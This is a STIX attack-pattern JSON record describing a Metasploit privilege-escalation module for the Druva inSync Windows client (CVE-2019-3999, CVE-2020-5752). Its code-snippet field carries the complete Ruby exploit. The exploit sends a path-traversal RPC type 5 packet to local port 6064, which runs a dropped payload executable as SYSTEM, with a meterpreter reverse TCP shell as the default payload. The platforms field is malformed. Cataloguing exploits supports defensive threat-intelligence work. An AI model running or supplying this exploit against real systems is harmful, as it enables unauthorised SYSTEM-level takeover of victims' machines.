{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6960b016-5d11-4984-895a-63241e499d83",
    "created": "2024-08-14T16:49:40.42768Z",
    "modified": "2024-08-14T16:49:40.427683Z",
    "name": "Druva inSync inSyncCPHwnet64.exe RPC Type 5 Privilege Escalation",
    "description": " Druva inSync client for Windows exposes a network service on TCP port 6064 on the local network interface. inSync versions 6.6.3 and prior do not properly validate user-supplied program paths in RPC type 5 messages, allowing execution of arbitrary commands as SYSTEM.  This module has been tested successfully on inSync versions 6.5.2r99097 and 6.6.3r102156 on Windows 7 SP1 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc.rb",
            "external_id": "druva_insync_insynccphwnet64_rcp_type_5_priv_esc.rb"
        },
        {
            "source_name": "ChrisLyne",
            "external_id": "#(@lynerc)Discoveryandexploit(CVE-2019-3999);discoveryoftraversalbypass(CVE-2020-5752)forCVE-2019-3999patch."
        },
        {
            "source_name": "MatteoMalvica",
            "external_id": "#Duplicateindependentdiscoveryoftraversalbypass(CVE-2020-5752)"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-3999"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5752"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/security/research/tra-2020-12"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/security/research/tra-2020-34"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/tenable/poc/blob/master/druva/inSync/druva_win_cphwnet64.py"
        },
        {
            "source_name": "reference",
            "url": "https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::Services\n  include Exploit::EXE\n  include Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Druva inSync inSyncCPHwnet64.exe RPC Type 5 Privilege Escalation',\n          'Description' => %q{\n            Druva inSync client for Windows exposes a network service on TCP\n            port 6064 on the local network interface. inSync versions 6.6.3\n            and prior do not properly validate user-supplied program paths\n            in RPC type 5 messages, allowing execution of arbitrary commands\n            as SYSTEM.\n\n            This module has been tested successfully on inSync versions\n            6.5.2r99097 and 6.6.3r102156 on Windows 7 SP1 (x64).\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Chris Lyne', # (@lynerc) Discovery and exploit (CVE-2019-3999); discovery of traversal bypass (CVE-2020-5752) for CVE-2019-3999 patch.\n            'Matteo Malvica', # Duplicate independent discovery of traversal bypass (CVE-2020-5752)\n            'bcoles' # Metasploit\n          ],\n          'References' => [\n            ['CVE', '2019-3999'],\n            ['CVE', '2020-5752'],\n            ['EDB', '48400'],\n            ['EDB', '48505'],\n            ['EDB', '49211'],\n            ['PACKETSTORM', '157493'],\n            ['PACKETSTORM', '157802'],\n            ['PACKETSTORM', '160404'],\n            ['URL', 'https://www.tenable.com/security/research/tra-2020-12'],\n            ['URL', 'https://www.tenable.com/security/research/tra-2020-34'],\n            ['URL', 'https://github.com/tenable/poc/blob/master/druva/inSync/druva_win_cphwnet64.py'],\n            ['URL', 'https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/'],\n          ],\n          'Platform' => [\n            'win'\n          ],\n          'SessionTypes' => [\n            'meterpreter'\n          ],\n          'Targets' => [\n            [\n              'Automatic',\n              {}\n            ]\n          ],\n          'DisclosureDate' => '2020-02-25',\n          'DefaultOptions' => {\n            'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n          },\n          'Notes' => {\n            'Reliability' =>\n            [\n              REPEATABLE_SESSION\n            ],\n            'Stability' =>\n            [\n              CRASH_SAFE\n            ]\n          },\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_config_getenv\n              ]\n            }\n          }\n        }\n      )\n    )\n    register_advanced_options([\n      OptString.new(\n        'WritableDir',\n        [\n          false,\n          'A directory where we can write files (%TEMP% by default)',\n          nil\n        ]\n      ),\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].blank? ? session.sys.config.getenv('TEMP') : datastore['WritableDir'].to_s\n  end\n\n  def execute_command(host, port, command)\n    header = 'inSync PHC RPCW[v0002]'\n    rpc_type = [5].pack('V')\n    cmd = \"C:\\\\ProgramData\\\\Druva\\\\inSync4\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe /c \\\"#{command}\\\"\".force_encoding('UTF-8').unpack('U*').pack('v*')\n\n    pkt = header\n    pkt << rpc_type\n    pkt << [cmd.length].pack('V')\n    pkt << cmd\n\n    result = session.railgun.ws2_32.WSASocketA('AF_INET', 'SOCK_STREAM', 'IPPROTO_TCP', nil, nil, 0)\n\n    unless result['GetLastError'] == 0\n      fail_with(Failure::Unknown, \"Could not create socket: #{result['ErrorMessage']}\")\n    end\n\n    socket = result['return']\n\n    sock_addr = [AF_INET].pack('v')\n    sock_addr << [port].pack('n')\n    sock_addr << Rex::Socket.addr_aton(host)\n    sock_addr << \"\\x00\" * 8\n\n    print_status(\"Connecting to #{host}:#{port} ...\")\n\n    result = client.railgun.ws2_32.connect(socket, sock_addr, sock_addr.length)\n\n    unless result['GetLastError'] == 0\n      fail_with(Failure::Unreachable, \"Could not connect to #{host}:#{port} : #{result['ErrorMessage']}\")\n    end\n\n    print_status(\"Sending packet (#{pkt.length} bytes) to #{host}:#{port} ...\")\n    vprint_status(\"Sending: #{pkt.inspect}\")\n\n    result = session.railgun.ws2_32.sendto(socket, pkt, pkt.length, 0, sock_addr, sock_addr.length)\n\n    unless result['GetLastError'] == 0\n      fail_with(Failure::NotVulnerable, \"Could not send data to port: #{result['ErrorMessage']}\")\n    end\n\n    session.railgun.ws2_32.closesocket(socket)\n  end\n\n  def check\n    service = 'inSyncCPHService'\n\n    unless service_exists?(service)\n      return CheckCode::Safe(\"Service '#{service}' does not exist.\")\n    end\n\n    CheckCode::Detected(\"Service '#{service}' exists.\")\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::BadConfig, 'Session already has SYSTEM privileges')\n    end\n\n    payload_path = \"#{base_dir}\\\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe\"\n    payload_exe = generate_payload_exe\n    vprint_status(\"Writing payload (#{payload.encoded.length} bytes) to #{payload_path} ...\")\n    write_file(payload_path, payload_exe)\n    register_file_for_cleanup(payload_path)\n\n    execute_command('127.0.0.1', 6064, payload_path)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-25",
    "x_mitre_platforms": [
        "["
    ]
}